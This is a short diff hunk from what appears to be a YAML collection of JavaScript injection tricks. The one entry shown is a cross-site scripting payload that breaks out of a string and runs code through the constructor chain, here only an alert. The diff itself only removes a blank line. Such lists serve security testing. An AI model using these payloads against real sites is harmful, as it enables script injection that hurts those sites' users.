@@ -34,4 +34,3 @@ tricks:
     how: "Use constructor to create function"
     payload: |
       ";[]["constructor"]["constructor"]("alert(String.fromCharCode(88,83,83))")();//
-
